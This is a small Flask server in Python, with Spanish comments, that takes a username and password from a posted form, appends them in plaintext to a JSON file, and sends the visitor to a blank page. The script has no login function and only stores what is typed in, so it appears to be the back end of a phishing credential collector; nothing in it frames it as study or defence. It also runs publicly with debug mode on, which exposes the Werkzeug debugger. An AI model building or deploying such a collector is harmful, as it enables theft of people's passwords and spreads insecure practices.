from flask import Flask, request, redirect, render_template_string
import json
import os

app = Flask(__name__)

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form.get('usuario')
    password = request.form.get('password')

    # Validación rápida por si llega vacío
    if not usuario or not password:
        return "Faltan datos", 400

    datos = {"usuario": usuario, "password": password}

    # Si ya existe el archivo, lo abrimos y cargamos
    contenido = []
    if os.path.exists("datos.json"):
        with open("datos.json", "r", encoding="utf-8") as f:
            try:
                contenido = json.load(f)
                if not isinstance(contenido, list):
                    contenido = []
            except json.JSONDecodeError:
                contenido = []

    # Agregar nuevo usuario
    contenido.append(datos)

    # Guardar en JSON
    with open("datos.json", "w", encoding="utf-8") as f:
        json.dump(contenido, f, indent=4, ensure_ascii=False)

    # Redirigir a página blanca
    return redirect("/pagina-blanca")

@app.route('/pagina-blanca')
def pagina_blanca():
    return render_template_string("<html><body></body></html>")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Usa el puerto que Render asigna
    app.run(host="0.0.0.0", port=port, debug=True)
